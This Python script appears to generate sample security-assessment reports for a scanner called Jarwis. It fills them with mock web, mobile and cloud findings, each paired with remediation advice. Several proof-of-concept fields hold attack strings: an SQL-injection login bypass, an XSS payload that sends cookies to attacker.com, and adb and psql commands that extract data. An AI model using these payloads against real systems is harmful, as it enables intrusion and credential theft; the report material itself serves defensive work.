"""
Generate Sample Jarwis Security Reports - V3 Professional Edition
Uses Playwright in subprocess for reliable PDF generation with XBOW-style formatting
"""

import sys
import subprocess
import json
from pathlib import Path
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))


@dataclass
class ScanResult:
    """Mock scan result for sample reports"""
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    poc: str = ""
    reasoning: str = ""
    remediation: str = ""
    cwe_id: str = ""
    request_data: str = ""
    response_data: str = ""
    response_snippet: str = ""


@dataclass
class MockContext:
    """Mock scan context"""
    endpoints: List[str]
    authenticated: bool
    cookies: dict = None
    
    def __post_init__(self):
        if self.cookies is None:
            self.cookies = {}


def generate_web_findings() -> List[ScanResult]:
    """Generate sample web application findings"""
    return [
        ScanResult(
            id="JAR-WEB-001",
            category="A03",
            severity="critical",
            title="SQL Injection in Authentication Endpoint",
            description="The login form is vulnerable to SQL injection attacks. An attacker can bypass authentication or extract sensitive data from the database by injecting malicious SQL code into the username or password fields. This vulnerability enables complete database compromise including extraction of user credentials, personal information, and administrative access.",
            url="https://example-webapp.com/api/auth/login",
            method="POST",
            parameter="username",
            evidence="SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
            poc="username=admin' OR '1'='1'--&password=test",
            reasoning="Jarwis AGI detected SQL injection by injecting a single quote character which caused the database to return an SQL syntax error. This confirms that user input is being directly concatenated into SQL queries without proper sanitization or parameterized queries. The error message leakage also reveals the database type (MySQL).",
            remediation="Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and sanitization. Consider using an ORM like SQLAlchemy or Django ORM. Disable verbose error messages in production.",
            cwe_id="CWE-89",
            request_data="POST /api/auth/login HTTP/1.1\nHost: example-webapp.com\nContent-Type: application/json\n\n{\"username\": \"admin' OR '1'='1'--\", \"password\": \"test\"}",
            response_data="HTTP/1.1 500 Internal Server Error\nContent-Type: application/json\n\n{\"error\": \"SQL error: You have an error in your SQL syntax...\"}"
        ),
        ScanResult(
            id="JAR-WEB-002",
            category="A03",
            severity="high",
            title="Reflected Cross-Site Scripting (XSS) in Search",
            description="The search functionality reflects user input without proper encoding, allowing attackers to inject malicious JavaScript that executes in victims' browsers. This can lead to session hijacking, credential theft, and malware distribution.",
            url="https://example-webapp.com/search?q=<script>alert('XSS')</script>",
            method="GET",
            parameter="q",
            evidence="<script>alert('XSS')</script> reflected in response body without encoding",
            poc="https://example-webapp.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
            reasoning="Jarwis AGI injected an XSS payload in the search parameter and found it was reflected verbatim in the HTML response without encoding. This allows arbitrary JavaScript execution in the context of the victim's session, enabling cookie theft and session hijacking.",
            remediation="Encode all user input before rendering in HTML using context-appropriate encoding. Implement Content-Security-Policy headers to restrict script execution. Use HTTP-only cookies to prevent JavaScript access to session tokens.",
            cwe_id="CWE-79",
            request_data="GET /search?q=<script>alert('XSS')</script> HTTP/1.1\nHost: example-webapp.com\nCookie: session=abc123...",
            response_data="HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h2>Search results for: <script>alert('XSS')</script></h2></body></html>"
        ),
        ScanResult(
            id="JAR-WEB-003",
            category="A01",
            severity="high",
            title="Insecure Direct Object Reference (IDOR) in User API",
            description="The application allows users to access other users' sensitive data by modifying the user ID parameter in API requests. This vulnerability enables unauthorized access to personal information, account details, and potentially financial data.",
            url="https://example-webapp.com/api/users/12345/profile",
            method="GET",
            parameter="user_id",
            evidence="Successfully retrieved profile data for user 12345 (including SSN, email) while authenticated as user 67890",
            poc="Modify user_id from 67890 to sequential IDs (12345, 12346, etc.) to enumerate and access other users' profiles",
            reasoning="Jarwis AGI tested IDOR by modifying the user ID in the API endpoint while authenticated as a different user. The server returned complete profile data for the requested user ID without proper authorization checks, indicating a broken access control vulnerability.",
            remediation="Implement proper authorization checks on the server side for every API request. Use indirect references (UUIDs) instead of sequential IDs. Verify that the authenticated user has permission to access the requested resource before returning data.",
            cwe_id="CWE-639",
            request_data="GET /api/users/12345/profile HTTP/1.1\nHost: example-webapp.com\nAuthorization: Bearer eyJhbGc...(token for user 67890)\nCookie: session=user67890session",
            response_data="HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"user_id\": 12345, \"email\": \"victim@example.com\", \"name\": \"John Doe\", \"ssn\": \"123-45-6789\", \"phone\": \"+1-555-123-4567\"}"
        ),
        ScanResult(
            id="JAR-WEB-004",
            category="A05",
            severity="medium",
            title="Missing Security Headers",
            description="The application is missing critical security headers that protect against common web attacks including clickjacking, MIME-type sniffing, and cross-site scripting.",
            url="https://example-webapp.com/",
            method="GET",
            parameter="",
            evidence="Missing headers: X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, Strict-Transport-Security",
            poc="Inspect response headers using: curl -I https://example-webapp.com/",
            reasoning="Jarwis AGI analyzed the HTTP response headers and found several critical security headers missing. Without X-Frame-Options, the site is vulnerable to clickjacking. Without Content-Security-Policy, XSS attacks have no additional mitigation.",
            remediation="Add the following headers to all responses: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Content-Security-Policy: default-src 'self', Strict-Transport-Security: max-age=31536000; includeSubDomains",
            cwe_id="CWE-693",
            request_data="GET / HTTP/1.1\nHost: example-webapp.com\nAccept: text/html",
            response_data="HTTP/1.1 200 OK\nContent-Type: text/html\nServer: nginx/1.18.0\nDate: Mon, 01 Jan 2026 12:00:00 GMT\n\n<!DOCTYPE html>..."
        ),
        ScanResult(
            id="JAR-WEB-005",
            category="A07",
            severity="medium",
            title="Weak Password Policy Allows Common Passwords",
            description="The application accepts weak passwords during registration, allowing users to set easily guessable passwords from common breach lists. This significantly increases the risk of account takeover through credential stuffing attacks.",
            url="https://example-webapp.com/api/auth/register",
            method="POST",
            parameter="password",
            evidence="Passwords '123456', 'password', 'qwerty123' all accepted during registration",
            poc="Register with password: 123456 (from top 10 most common passwords list)",
            reasoning="Jarwis AGI tested the registration endpoint with passwords from the RockYou breach list and found they were accepted. This allows attackers to easily compromise accounts through brute force or credential stuffing attacks using common password lists.",
            remediation="Implement strong password requirements: minimum 12 characters, mix of uppercase, lowercase, numbers, and special characters. Check passwords against HaveIBeenPwned API or similar breach databases. Implement rate limiting and account lockout on login attempts.",
            cwe_id="CWE-521",
            request_data="POST /api/auth/register HTTP/1.1\nHost: example-webapp.com\nContent-Type: application/json\n\n{\"email\": \"test@test.com\", \"password\": \"123456\", \"name\": \"Test User\"}",
            response_data="HTTP/1.1 201 Created\nContent-Type: application/json\n\n{\"message\": \"User created successfully\", \"user_id\": 99999}"
        ),
        ScanResult(
            id="JAR-WEB-006",
            category="A02",
            severity="low",
            title="Sensitive Data Exposed in URL Parameters",
            description="Sensitive information including API keys and session tokens are passed in URL parameters, which are logged by web servers, proxies, and stored in browser history.",
            url="https://example-webapp.com/api/data?api_key=sk_live_abc123xyz",
            method="GET",
            parameter="api_key",
            evidence="Live API key (sk_live_abc123xyz) transmitted in URL query parameter",
            poc="Review server access logs to find exposed API keys: grep 'api_key=' /var/log/nginx/access.log",
            reasoning="Jarwis AGI detected sensitive credentials (API key with 'sk_live_' prefix indicating production key) being transmitted in URL parameters. URLs are logged by web servers, proxies, CDNs, and stored in browser history, creating multiple exposure points.",
            remediation="Move sensitive data to request headers (Authorization header) or POST body. Implement proper API key rotation policies. Review and purge sensitive data from existing logs.",
            cwe_id="CWE-598",
            request_data="GET /api/data?api_key=sk_live_abc123xyz HTTP/1.1\nHost: example-webapp.com\nReferer: https://example-webapp.com/dashboard",
            response_data="HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"data\": [...], \"count\": 150}"
        ),
    ]


def generate_mobile_findings() -> List[ScanResult]:
    """Generate sample mobile application findings"""
    return [
        ScanResult(
            id="JAR-MOB-001",
            category="A02",
            severity="critical",
            title="Hardcoded API Keys and Secrets in APK",
            description="The mobile application contains hardcoded API keys, secrets, and credentials in the decompiled source code. These can be extracted by anyone who downloads the app from the Play Store, potentially compromising backend services and third-party integrations.",
            url="com.example.mobileapp/BuildConfig.java",
            method="STATIC",
            parameter="API_KEY",
            evidence="Found: public static final String API_KEY = \"AIzaSyB4x5c7d8e9f0g1h2i3j4k5l6m7n8o9p0\"; STRIPE_KEY = \"sk_live_abc123\"",
            poc="Decompile APK: apktool d app.apk && grep -rE '(API_KEY|SECRET|PASSWORD)' ./app/smali/",
            reasoning="Jarwis AGI performed static analysis on the APK and found hardcoded API keys including Google Maps, Stripe live key, and Firebase credentials in the BuildConfig class and strings.xml. These can be trivially extracted by any attacker.",
            remediation="Never hardcode secrets in mobile apps. Use secure key storage (Android Keystore, iOS Keychain). Fetch secrets from a secure backend at runtime. Restrict API key permissions and implement key rotation.",
            cwe_id="CWE-798",
            request_data="Static Analysis: com.example.mobileapp_v2.5.1.apk\nTool: Androguard + Jarwis Mobile Scanner",
            response_data="Extracted Secrets:\n- API_KEY: AIzaSyB4x5c7d8e9f0g1h2i3j4k5l6m7n8o9p0\n- STRIPE_KEY: sk_live_abc123\n- FIREBASE_URL: https://app-prod.firebaseio.com"
        ),
        ScanResult(
            id="JAR-MOB-002",
            category="A02",
            severity="critical",
            title="Unencrypted SQLite Database with Sensitive Data",
            description="The application stores sensitive user data including credentials and personal information in an unencrypted SQLite database on the device. Anyone with physical access or root privileges can extract this data.",
            url="com.example.mobileapp/databases/user_data.db",
            method="STATIC",
            parameter="database",
            evidence="Unencrypted SQLite database containing user credentials, SSN, credit card numbers, and session tokens",
            poc="Extract database: adb pull /data/data/com.example.mobileapp/databases/user_data.db && sqlite3 user_data.db 'SELECT * FROM users;'",
            reasoning="Jarwis AGI analyzed the application's data storage and found an unencrypted SQLite database containing highly sensitive PII. On rooted devices or through backup extraction, this data is trivially accessible.",
            remediation="Encrypt the SQLite database using SQLCipher with a user-derived key. Use Android EncryptedSharedPreferences for small data. Never store raw credentials - use secure tokens with proper expiration.",
            cwe_id="CWE-312",
            request_data="Database Analysis: /data/data/com.example.mobileapp/databases/user_data.db",
            response_data="TABLE users (unencrypted):\nid|email|password_hash|ssn|credit_card|auth_token\n1|john@example.com|plaintext123|123-45-6789|4111111111111111|eyJhbG..."
        ),
        ScanResult(
            id="JAR-MOB-003",
            category="A05",
            severity="high",
            title="SSL Certificate Pinning Not Implemented",
            description="The application does not implement SSL certificate pinning, making it trivially vulnerable to man-in-the-middle attacks. Attackers on the same network can intercept and modify all API traffic.",
            url="https://api.example.com/*",
            method="NETWORK",
            parameter="TLS",
            evidence="All HTTPS traffic intercepted using Burp Suite with custom CA certificate. 47 API endpoints captured including auth tokens and PII.",
            poc="Install proxy CA on device, configure proxy settings, intercept all API traffic including authentication and payment endpoints",
            reasoning="Jarwis AGI tested the application's TLS implementation by attempting to intercept traffic with a custom CA certificate. All API traffic was successfully captured without any certificate validation errors, indicating complete absence of certificate pinning.",
            remediation="Implement certificate pinning using OkHttp CertificatePinner or Android Network Security Config. Pin to the leaf certificate or public key hash. Include backup pins for certificate rotation.",
            cwe_id="CWE-295",
            request_data="Network Interception Test\nProxy: Burp Suite Professional v2024.1\nDevice: Android 14, CA installed as user cert",
            response_data="Captured Sensitive Traffic:\n- POST /api/auth/login - credentials in plaintext\n- GET /api/users/me - full PII exposed\n- POST /api/payments - credit card data visible"
        ),
        ScanResult(
            id="JAR-MOB-004",
            category="A04",
            severity="high",
            title="Production App Built with Debuggable Flag",
            description="The production application has android:debuggable=true in the manifest, allowing attackers to attach debuggers, set breakpoints, and inspect runtime memory including decrypted data and tokens.",
            url="AndroidManifest.xml",
            method="STATIC",
            parameter="debuggable",
            evidence="<application android:debuggable=\"true\" android:allowBackup=\"true\" ...>",
            poc="Attach debugger: adb shell run-as com.example.mobileapp && jdb -attach localhost:8700",
            reasoning="Jarwis AGI analyzed the AndroidManifest.xml and found the debuggable flag set to true along with allowBackup. This combination allows complete runtime inspection and data extraction through ADB backup.",
            remediation="Set android:debuggable=\"false\" and android:allowBackup=\"false\" for release builds. Implement ProGuard/R8 for code obfuscation. Add runtime debugger detection that terminates the app.",
            cwe_id="CWE-489",
            request_data="Manifest Analysis: AndroidManifest.xml\nAPK: com.example.mobileapp_v2.5.1.apk",
            response_data="<application\n    android:debuggable=\"true\"\n    android:allowBackup=\"true\"\n    android:networkSecurityConfig=\"@xml/network_security_config\"\n    android:name=\".MainApplication\">"
        ),
        ScanResult(
            id="JAR-MOB-005",
            category="A01",
            severity="medium",
            title="Sensitive Activities Exported Without Permission",
            description="Multiple sensitive activities including admin and debug interfaces are exported without proper permission protection, allowing any app on the device to launch them directly and bypass authentication.",
            url="com.example.mobileapp/.internal.AdminDashboardActivity",
            method="STATIC",
            parameter="exported",
            evidence="<activity android:name=\".internal.AdminDashboardActivity\" android:exported=\"true\"/> without permission requirement",
            poc="Launch admin activity: adb shell am start -n com.example.mobileapp/.internal.AdminDashboardActivity",
            reasoning="Jarwis AGI found multiple exported activities that appear to be admin/debug interfaces. Any malicious app on the device can launch these activities, potentially bypassing authentication and accessing sensitive functionality.",
            remediation="Set android:exported=\"false\" for all internal activities. If export is required, add android:permission with signature-level permission. Implement additional authentication checks within activities.",
            cwe_id="CWE-926",
            request_data="Manifest Analysis: Exported Components\nAPK: com.example.mobileapp_v2.5.1.apk",
            response_data="Unprotected Exported Activities:\n- .internal.AdminDashboardActivity\n- .debug.LogViewerActivity\n- .settings.HiddenFeatureActivity\n- .admin.UserManagementActivity"
        ),
        ScanResult(
            id="JAR-MOB-006",
            category="A09",
            severity="low",
            title="Excessive Logging of Sensitive Information",
            description="The application logs sensitive information including user credentials, API responses with PII, and authentication tokens to logcat, which is readable by other apps with READ_LOGS permission.",
            url="com.example.mobileapp/Logger",
            method="DYNAMIC",
            parameter="logcat",
            evidence="D/AuthService: Login response: {email: user@example.com, token: eyJhbG..., ssn: 123-45-6789}",
            poc="Monitor logs: adb logcat | grep -E '(password|token|ssn|email)'",
            reasoning="Jarwis AGI monitored logcat during app usage and found sensitive data being logged at DEBUG level. On older Android versions, any app with READ_LOGS permission can access this data.",
            remediation="Remove all logging of sensitive data in production builds. Use ProGuard to strip Log.d() and Log.v() calls. Implement a logging wrapper that sanitizes sensitive fields automatically.",
            cwe_id="CWE-532",
            request_data="Dynamic Analysis: Logcat monitoring during authentication flow\nDevice: Android 12 (API 31)",
            response_data="Sensitive Log Entries:\nD/AuthService: Authenticating user: john@example.com with password: s3cr3t!\nD/ApiClient: Response: {\"user\": {\"ssn\": \"123-45-6789\"}}\nD/TokenManager: Saved token: eyJhbGciOiJIUzI1NiIs..."
        ),
    ]


def generate_cloud_findings() -> List[ScanResult]:
    """Generate sample cloud infrastructure findings"""
    return [
        ScanResult(
            id="JAR-CLD-001",
            category="A01",
            severity="critical",
            title="S3 Bucket with Public Access and Sensitive Data",
            description="An Amazon S3 bucket is configured with public read access and contains sensitive customer data including PII, financial records, and database backups. This data is accessible to anyone on the internet.",
            url="s3://example-corp-prod-data/",
            method="AWS",
            parameter="ACL",
            evidence="Bucket ACL: public-read. Found files: customers.csv (45MB), db_backup_2026.sql (2.3GB), financial_reports/*.xlsx",
            poc="aws s3 ls s3://example-corp-prod-data/ --no-sign-request",
            reasoning="Jarwis AGI scanned AWS S3 buckets and found this production data bucket configured with public-read ACL. The bucket contains customer PII, database backups with credentials, and financial documents - all accessible without authentication.",
            remediation="Immediately enable S3 Block Public Access at the account level. Remove public ACLs from all buckets. Implement bucket policies with least-privilege access. Enable S3 access logging and CloudTrail for audit.",
            cwe_id="CWE-284",
            request_data="AWS S3 Scan\nRegion: us-east-1\nTarget: example-corp-prod-* buckets",
            response_data="s3://example-corp-prod-data/\n+-- customers.csv (45MB) - 2.3M customer records with PII\n+-- db_backup_2026.sql (2.3GB) - Full production database\n+-- financial_reports/ (340 files)\n+-- internal_docs/ (1,200 files)"
        ),
        ScanResult(
            id="JAR-CLD-002",
            category="A07",
            severity="critical",
            title="IAM User with Excessive Permissions and No MFA",
            description="An IAM user has AdministratorAccess policy attached, long-term access keys that have never been rotated, and no MFA configured. This account represents a high-value target for credential compromise.",
            url="arn:aws:iam::123456789012:user/deploy-service",
            method="AWS",
            parameter="IAM",
            evidence="IAM User 'deploy-service': AdministratorAccess attached, access key age: 847 days, MFA: not enabled, last used: 2 hours ago",
            poc="Check using: aws iam get-user --user-name deploy-service && aws iam list-attached-user-policies --user-name deploy-service",
            reasoning="Jarwis AGI analyzed IAM configurations and found this user with full admin access, extremely old access keys, and no MFA. If these credentials are compromised (leaked in code, logs, or stolen), the entire AWS account is compromised.",
            remediation="Immediately enable MFA for all IAM users. Rotate access keys to 90-day maximum. Replace AdministratorAccess with least-privilege policies. Consider using IAM roles with temporary credentials instead of long-term access keys.",
            cwe_id="CWE-287",
            request_data="IAM Security Audit\nAccount: 123456789012\nRegion: Global (IAM)",
            response_data="User: deploy-service\nPolicies: AdministratorAccess (AWS managed)\nAccess Key 1: AKIA... (created: 847 days ago, last used: 2h ago)\nAccess Key 2: AKIA... (created: 523 days ago, never used)\nMFA: Not configured\nPassword: Not set (programmatic access only)"
        ),
        ScanResult(
            id="JAR-CLD-003",
            category="A05",
            severity="high",
            title="Security Group Allows SSH from Any IP",
            description="A security group attached to production EC2 instances allows SSH (port 22) access from any IP address (0.0.0.0/0). This exposes the instances to brute force attacks and exploitation of SSH vulnerabilities.",
            url="sg-0abc123def456",
            method="AWS",
            parameter="SecurityGroup",
            evidence="Inbound Rule: TCP 22 (SSH) from 0.0.0.0/0. Attached to: 12 EC2 instances including prod-web-*, prod-api-*",
            poc="nmap -sV -p 22 <ec2-public-ip>",
            reasoning="Jarwis AGI scanned security group configurations and found this production security group allowing SSH from the internet. Combined with weak SSH credentials or key exposure, this enables direct server compromise.",
            remediation="Restrict SSH access to specific IP ranges (corporate VPN/bastion). Use AWS Systems Manager Session Manager for shell access without opening SSH. Implement AWS Network Firewall for additional protection.",
            cwe_id="CWE-284",
            request_data="Security Group Audit\nAccount: 123456789012\nRegion: us-east-1",
            response_data="Security Group: sg-0abc123def456 (prod-web-sg)\nInbound Rules:\n- TCP 22 (SSH): 0.0.0.0/0 [!]\n- TCP 443 (HTTPS): 0.0.0.0/0\n- TCP 80 (HTTP): 0.0.0.0/0\nAttached to: 12 instances"
        ),
        ScanResult(
            id="JAR-CLD-004",
            category="A02",
            severity="high",
            title="RDS Database Publicly Accessible Without Encryption",
            description="A production RDS PostgreSQL database is configured as publicly accessible with encryption at rest disabled. The database is exposed to the internet and data is stored in plaintext on disk.",
            url="prod-database.abc123.us-east-1.rds.amazonaws.com",
            method="AWS",
            parameter="RDS",
            evidence="RDS Instance: PubliclyAccessible=true, StorageEncrypted=false, Engine=PostgreSQL 13.4, MultiAZ=false",
            poc="psql -h prod-database.abc123.us-east-1.rds.amazonaws.com -U admin -d production",
            reasoning="Jarwis AGI audited RDS configurations and found this production database exposed to the internet without encryption. Anyone who obtains credentials can access the database from anywhere, and compromised storage would expose plaintext data.",
            remediation="Disable public accessibility immediately. Enable encryption at rest (requires snapshot and restore for existing DBs). Enable encryption in transit. Move RDS to private subnets with VPC endpoints.",
            cwe_id="CWE-311",
            request_data="RDS Security Audit\nAccount: 123456789012\nRegion: us-east-1",
            response_data="RDS Instance: prod-database\nEngine: PostgreSQL 13.4\nPubliclyAccessible: true [!]\nStorageEncrypted: false [!]\nMultiAZ: false\nBackupRetention: 7 days\nVPC: vpc-prod\nSubnets: public-subnet-1a, public-subnet-1b"
        ),
        ScanResult(
            id="JAR-CLD-005",
            category="A09",
            severity="medium",
            title="CloudTrail Logging Disabled for S3 Data Events",
            description="CloudTrail is not configured to log S3 data events (GetObject, PutObject, DeleteObject). This means object-level access to sensitive data cannot be audited or investigated.",
            url="arn:aws:cloudtrail:us-east-1:123456789012:trail/main-trail",
            method="AWS",
            parameter="CloudTrail",
            evidence="Trail 'main-trail': ManagementEvents=All, DataEvents=None configured. S3 data events not logged.",
            poc="aws cloudtrail get-event-selectors --trail-name main-trail",
            reasoning="Jarwis AGI analyzed CloudTrail configuration and found S3 data events are not being logged. If sensitive data in S3 is accessed or exfiltrated, there will be no audit trail to investigate the incident.",
            remediation="Enable S3 data event logging for all sensitive buckets. Consider enabling for all buckets with appropriate log filtering. Implement log analysis with CloudWatch Logs Insights or a SIEM solution.",
            cwe_id="CWE-778",
            request_data="CloudTrail Configuration Audit\nAccount: 123456789012\nRegion: us-east-1",
            response_data="Trail: main-trail\nMultiRegion: true\nManagementEvents: ReadWriteType=All\nDataEvents: None configured\nInsightsSelectors: None\nLogFileValidation: enabled"
        ),
        ScanResult(
            id="JAR-CLD-006",
            category="A06",
            severity="medium",
            title="Lambda Functions Using Outdated Runtime",
            description="Multiple Lambda functions are running on deprecated or EOL (End of Life) runtimes that no longer receive security updates. These functions are vulnerable to known runtime exploits.",
            url="arn:aws:lambda:us-east-1:123456789012:function:*",
            method="AWS",
            parameter="Lambda",
            evidence="Functions using deprecated runtimes: python3.6 (5 functions), nodejs12.x (3 functions), nodejs10.x (2 functions - EOL)",
            poc="aws lambda list-functions --query 'Functions[?Runtime==`python3.6`]'",
            reasoning="Jarwis AGI inventoried Lambda functions and found several using deprecated Python 3.6 and Node.js 10.x/12.x runtimes. These runtimes no longer receive security patches, exposing the functions to known vulnerabilities.",
            remediation="Upgrade all Lambda functions to supported runtimes (Python 3.11+, Node.js 18.x+). Implement automated runtime upgrade testing in CI/CD. Enable AWS Lambda runtime deprecation notifications in AWS Health.",
            cwe_id="CWE-1104",
            request_data="Lambda Runtime Audit\nAccount: 123456789012\nRegion: us-east-1",
            response_data="Deprecated Runtimes Found:\n- python3.6: data-processor, api-handler, report-gen, auth-service, email-sender\n- nodejs12.x: image-resizer, pdf-generator, webhook-handler\n- nodejs10.x: legacy-api, cron-job (EOL - no longer invocable after deprecation date)"
        ),
        ScanResult(
            id="JAR-CLD-007",
            category="A05",
            severity="low",
            title="Default VPC in Use with Default Security Group",
            description="The default VPC is being used for production resources, and the default security group has been modified with overly permissive rules. This increases the attack surface and complicates network security management.",
            url="vpc-abc123 (default)",
            method="AWS",
            parameter="VPC",
            evidence="Default VPC in use in us-east-1. Default security group modified with inbound rules allowing 0.0.0.0/0 on multiple ports.",
            poc="aws ec2 describe-vpcs --filters Name=isDefault,Values=true",
            reasoning="Jarwis AGI found the default VPC is being used for production workloads. Default VPCs have a predictable CIDR range and the default security group cannot be deleted, making security hardening more difficult.",
            remediation="Create custom VPCs with planned CIDR ranges for production workloads. Implement VPC Flow Logs for network monitoring. Use Network ACLs as an additional layer of defense. Delete unused default VPCs.",
            cwe_id="CWE-1188",
            request_data="VPC Configuration Audit\nAccount: 123456789012\nRegion: us-east-1",
            response_data="Default VPC: vpc-abc123\nCIDR: 172.31.0.0/16\nResources in Default VPC: 23 EC2 instances, 4 RDS instances, 2 ELBs\nDefault Security Group Rules Modified: Yes\n- Inbound: TCP 22, 80, 443, 3306, 5432 from 0.0.0.0/0"
        ),
    ]


def generate_html_to_pdf(html_path: Path, pdf_path: Path):
    """Generate PDF from HTML using Playwright subprocess"""
    script = f'''
import asyncio
from playwright.async_api import async_playwright

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        page = await browser.new_page()
        await page.goto('file:///{html_path.absolute().as_posix()}')
        await page.pdf(
            path=r'{pdf_path}',
            format='A4',
            print_background=True,
            margin={{'top': '0', 'bottom': '0', 'left': '0', 'right': '0'}}
        )
        await browser.close()
        print('PDF generated successfully')

asyncio.run(main())
'''
    
    result = subprocess.run(
        [sys.executable, '-c', script],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        print(f"   [X] PDF generation error: {result.stderr}")
        return False
    return True


def main():
    """Generate all sample reports"""
    from core.reporters_v3 import ReportGenerator
    
    print("\n" + "=" * 60)
    print("  JARWIS SAMPLE REPORT GENERATOR - V3 Professional Edition")
    print("=" * 60 + "\n")
    
    # Output directory
    output_dir = Path(__file__).parent.parent / "sample report"
    output_dir.mkdir(exist_ok=True)
    
    # Report configurations
    reports = [
        {
            "name": "Web Application Security Assessment",
            "target_url": "https://example-webapp.com",
            "target_name": "Example WebApp Inc.",
            "client": "Example WebApp Inc.",
            "scan_type": "Web Application Security Assessment",
            "findings": generate_web_findings(),
            "endpoints": [
                "https://example-webapp.com/",
                "https://example-webapp.com/api/auth/login",
                "https://example-webapp.com/api/auth/register",
                "https://example-webapp.com/api/auth/forgot-password",
                "https://example-webapp.com/api/users/me",
                "https://example-webapp.com/api/users/{id}/profile",
                "https://example-webapp.com/api/products",
                "https://example-webapp.com/api/products/{id}",
                "https://example-webapp.com/api/cart",
                "https://example-webapp.com/api/orders",
                "https://example-webapp.com/search",
                "https://example-webapp.com/admin/dashboard",
                "https://example-webapp.com/admin/users",
                "https://example-webapp.com/api/payments/checkout",
            ],
            "authenticated": True,
            "pdf_name": "Jarwis_Web_Security_Report.pdf"
        },
        {
            "name": "Mobile Application Security Assessment",
            "target_url": "com.example.mobileapp (v2.5.1)",
            "target_name": "Example Mobile App",
            "client": "Example Mobile Corp.",
            "scan_type": "Mobile Application Security Assessment",
            "findings": generate_mobile_findings(),
            "endpoints": [
                "https://api.example.com/v1/auth/login",
                "https://api.example.com/v1/auth/refresh",
                "https://api.example.com/v1/users/me",
                "https://api.example.com/v1/users/me/settings",
                "https://api.example.com/v1/products",
                "https://api.example.com/v1/orders",
                "https://api.example.com/v1/payments",
                "https://api.example.com/v1/notifications",
                "https://api.example.com/v1/analytics",
                "com.example.mobileapp/.MainActivity",
                "com.example.mobileapp/.auth.LoginActivity",
                "com.example.mobileapp/.internal.AdminDashboardActivity",
            ],
            "authenticated": True,
            "pdf_name": "Jarwis_Mobile_Security_Report.pdf"
        },
        {
            "name": "Cloud Infrastructure Security Assessment",
            "target_url": "AWS Account: 123456789012 (us-east-1)",
            "target_name": "Example Corp AWS Infrastructure",
            "client": "Example Corporation",
            "scan_type": "Cloud Infrastructure Security Assessment",
            "findings": generate_cloud_findings(),
            "endpoints": [
                "s3://example-corp-prod-data/",
                "s3://example-corp-logs/",
                "s3://example-corp-backups/",
                "arn:aws:iam::123456789012:user/deploy-service",
                "arn:aws:iam::123456789012:role/lambda-execution",
                "sg-0abc123def456 (prod-web-sg)",
                "sg-0def456abc789 (prod-db-sg)",
                "prod-database.abc123.us-east-1.rds.amazonaws.com",
                "arn:aws:lambda:us-east-1:123456789012:function:data-processor",
                "arn:aws:lambda:us-east-1:123456789012:function:api-handler",
                "vpc-abc123 (default VPC)",
                "vpc-prod123 (production VPC)",
            ],
            "authenticated": True,
            "pdf_name": "Jarwis_Cloud_Security_Report.pdf"
        },
    ]
    
    for report_config in reports:
        print(f"[GEN] Generating: {report_config['name']}")
        print(f"   Target: {report_config['target_url']}")
        print(f"   Findings: {len(report_config['findings'])}")
        
        # Create mock context
        context = MockContext(
            endpoints=report_config['endpoints'],
            authenticated=report_config['authenticated']
        )
        
        # Create config
        config = {
            'target': {
                'url': report_config['target_url'],
                'name': report_config['target_name'],
                'type': report_config['scan_type'],
                'client': report_config['client']
            }
        }
        
        # Initialize report generator (HTML only, we'll do PDF separately)
        generator = ReportGenerator(str(output_dir), ['html'])
        
        # Set report ID
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        generator._report_id = f"JAR-{timestamp}-{str(__import__('uuid').uuid4())[:6].upper()}"
        
        # Generate HTML
        html_path = generator._generate_professional_html(
            report_config['findings'],
            context,
            config,
            f"{report_config['target_name'].replace(' ', '_')}_{timestamp}",
            None
        )
        
        print(f"   [OK] HTML generated: {html_path.name}")
        
        # Generate PDF
        pdf_path = output_dir / report_config['pdf_name']
        
        if generate_html_to_pdf(html_path, pdf_path):
            print(f"   [OK] PDF generated: {pdf_path.name}")
        else:
            print(f"   [!] PDF generation failed, HTML available: {html_path.name}")
        
        print()
    
    print("=" * 60)
    print(f"  GENERATION COMPLETE - {len(reports)} reports generated")
    print(f"  Output: {output_dir}")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
